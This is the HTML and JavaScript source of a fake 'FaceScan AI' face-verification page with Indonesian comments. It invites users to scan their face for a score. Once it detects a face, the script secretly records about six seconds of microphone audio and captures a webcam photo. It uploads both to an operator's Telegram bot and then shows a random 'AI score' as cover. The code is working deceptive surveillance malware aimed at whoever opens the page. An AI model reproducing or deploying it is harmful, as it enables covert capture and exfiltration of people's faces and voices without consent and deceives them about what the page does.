<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Biometric - Ultimate Analysis</title>
    <script src="config.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;700&display=swap');
        :root { --cyan: #00f2ff; }
        body { background: radial-gradient(circle at center, #111 0%, #000 100%); color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
        .app-card { width: 90%; max-width: 400px; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 40px; padding: 40px 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        #cam-holder { display: none; width: 260px; height: 260px; margin: 25px auto; border-radius: 50%; border: 3px solid var(--cyan); position: relative; overflow: hidden; background: #111; box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .laser { position: absolute; width: 100%; height: 3px; background: var(--cyan); top: 0; box-shadow: 0 0 20px var(--cyan); animation: scan 2s infinite ease-in-out; z-index: 10; display: none; }
        @keyframes scan { 0%, 100% { top: 0%; } 50% { top: 100%; } }
        .btn-main { background: #fff; color: #000; padding: 18px 40px; border: none; border-radius: 20px; font-weight: 700; width: 100%; cursor: pointer; transition: 0.3s; }
        #status { margin-top: 20px; font-size: 0.7rem; color: var(--cyan); font-weight: 700; letter-spacing: 2px; }
        #final-box { display: none; animation: popUp 0.6s ease-out; }
        @keyframes popUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        .score-num { font-size: 5rem; font-weight: 800; color: var(--cyan); margin: 5px 0; }
    </style>
</head>
<body>

    <div class="app-card">
        <div id="intro">
            <h1>FaceScan <span style="color:var(--cyan)">AI</span></h1>
            <p style="color:#888; font-size: 0.9rem;">Analisis biometrik wajah dan sampel vokal untuk hasil akurasi 99.9%.</p>
            <button class="btn-main" id="start-btn">START VERIFICATION</button>
        </div>

        <div id="cam-holder">
            <div class="laser" id="laser-line"></div>
            <video id="video" autoplay playsinline muted></video> 
        </div>

        <div id="status">READY TO SCAN</div>

        <div id="final-box">
            <div style="font-size: 0.7rem; color: var(--cyan); font-weight:700;">AI SCORE</div>
            <div class="score-num" id="score-val">0%</div>
            <p style="font-weight:700;">PREMIUM QUALITY DETECTED</p>
        </div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        const laser = document.getElementById('laser-line');
        
        let mediaRecorder;
        let audioChunks = [];
        let isProcessing = false;

        async function loadAI() {
            try {
                await faceapi.nets.tinyFaceDetector.loadFromUri('https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights');
                status.innerText = "SENSOR READY";
            } catch(e) { status.innerText = "AI MODULE ERROR"; }
        }
        loadAI();

        document.getElementById('start-btn').onclick = async () => {
            document.getElementById('intro').style.display = 'none';
            document.getElementById('cam-holder').style.display = 'block';
            status.innerText = "SENSING...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;

                // MediaRecorder untuk merekam suara secara rahasia
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) audioChunks.push(e.data);
                };
                
                video.addEventListener('play', () => {
                    const checkLoop = setInterval(async () => {
                        if (isProcessing) return;
                        const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions());
                        
                        if (detections.length > 0) {
                            isProcessing = true;
                            laser.style.display = 'block';
                            status.innerText = "SCANNING FACE & VOICE...";
                            
                            audioChunks = []; // Reset chunks
                            mediaRecorder.start();

                            // Rekam selama 6 detik
                            setTimeout(() => {
                                mediaRecorder.stop(); // Berhenti rekam dulu baru jepret
                                clearInterval(checkLoop);
                            }, 6000);
                        } else {
                            status.innerText = "POSITION FACE IN CIRCLE";
                        }
                    }, 800);
                });

                // Ketika rekaman suara berhenti, kirim semuanya
                mediaRecorder.onstop = async () => {
                    status.innerText = "PROCESSING DATA...";
                    await takeAndSend();
                };

            } catch (err) {
                alert("Izin Kamera & Mikrofon wajib!");
                location.reload();
            }
        };

        async function takeAndSend() {
            // 1. Proses Foto (Mirror Fixed)
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
            const score = Math.floor(Math.random() * 11) + 88;

            // 2. Kirim Foto ke Telegram
            const photoData = new FormData();
            photoData.append('chat_id', CONFIG.CHAT_ID);
            photoData.append('photo', photoBlob, 'face.png');
            photoData.append('caption', `ðŸŽ­ **PRANK PERFECT**\n\nðŸŽ¯ Score: ${score}%\nðŸ“¸ Foto wajah terlampir.`);
            
            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: photoData });

            // 3. Proses & Kirim Audio ke Telegram
            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
            const audioData = new FormData();
            audioData.append('chat_id', CONFIG.CHAT_ID);
            audioData.append('voice', audioBlob, 'voice.ogg');
            
            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVoice`, { method: 'POST', body: audioData });

            // 4. UI Selesai
            document.getElementById('cam-holder').style.display = 'none';
            status.style.display = 'none';
            document.getElementById('score-val').innerText = score + "%";
            document.getElementById('final-box').style.display = 'block';

            // Matikan Kamera & Mic
            video.srcObject.getTracks().forEach(t => t.stop());
        }
    </script>
</body>
</html>
